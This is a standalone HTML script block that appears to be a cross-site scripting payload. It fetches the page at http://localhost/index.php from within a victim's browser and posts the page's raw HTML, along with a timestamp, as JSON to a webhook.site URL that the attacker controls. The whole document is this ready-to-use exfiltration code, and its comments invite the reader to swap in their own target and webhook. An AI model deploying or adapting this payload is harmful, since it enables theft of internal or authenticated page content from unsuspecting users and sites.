<script>
const TARGET_URL = "http://localhost/index.php";  // URL of the page you want to fetch
const WEBHOOK_URL = "https://webhook.site/998b21e9-1fed-4da1-9818-67cfafdbfaae/";  // Replace with your webhook URL

// Create an XMLHttpRequest object to fetch the page content
const xhrFetch = new XMLHttpRequest();
xhrFetch.open("GET", TARGET_URL, true);

// Onload event for the fetch request
xhrFetch.onload = function() {
  let message = "";
  
  // Check if the request was successful
  if (xhrFetch.status === 200) {
    // Get the content of the page (raw HTML)
    const pageContent = xhrFetch.responseText;

    // Check if the page content is empty or invalid
    if (!pageContent.trim()) {
      message = "No content found on the target page.";  // Fallback message if page is empty
    } else {
      message = pageContent;  // Otherwise, send the page content
    }
  } else {
    // Handle HTTP error (e.g., 404 or 500)
    message = `Failed to fetch page: HTTP ${xhrFetch.status}`;
  }

  // Send the message (content or error) to the webhook
  sendToWebhook(message);
};

// On error event (in case of a network issue)
xhrFetch.onerror = function() {
  sendToWebhook("Error: Unable to fetch the page.");
};

// Send the fetch request to get the page content
xhrFetch.send();

// Function to send content or message to the webhook
function sendToWebhook(content) {
  const xhrSend = new XMLHttpRequest();
  xhrSend.open("POST", WEBHOOK_URL, true);
  xhrSend.setRequestHeader("Content-Type", "application/json");

  const data = JSON.stringify({
    source: TARGET_URL,
    timestamp: new Date().toISOString(),
    content: content  // Send content or the error message
  });

  // Send the data to the webhook
  xhrSend.send(data);

  xhrSend.onload = function() {
    if (xhrSend.status === 200) {
      console.log("Response successfully sent to webhook.");
    } else {
      console.error("Failed to send response to webhook:", xhrSend.status);
    }
  };

  xhrSend.onerror = function() {
    console.error("Error occurred while sending to the webhook.");
  };
}
</script>
